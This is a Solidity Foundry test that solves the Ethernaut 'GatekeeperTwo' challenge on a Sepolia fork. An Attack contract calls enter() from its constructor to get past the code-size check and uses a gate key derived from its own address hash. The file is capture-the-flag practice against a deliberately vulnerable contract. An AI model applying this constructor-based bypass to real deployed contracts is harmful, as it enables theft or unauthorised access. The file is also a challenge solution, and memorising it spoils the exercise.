// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6665750);
    }

    function test_Enter() public {
        Attack attack = new Attack();
    }

}

contract Attack {
    constructor() {
        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0xE24B80B446Bc33bCE44EcD0BE8A4f42C16BF4720);
        // GatekeeperTwo gatekeeperTwo = new GatekeeperTwo();

        console.log(gatekeeperTwo.entrant());

        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        gatekeeperTwo.enter(gateKey);

        console.log(gatekeeperTwo.entrant());
    }
}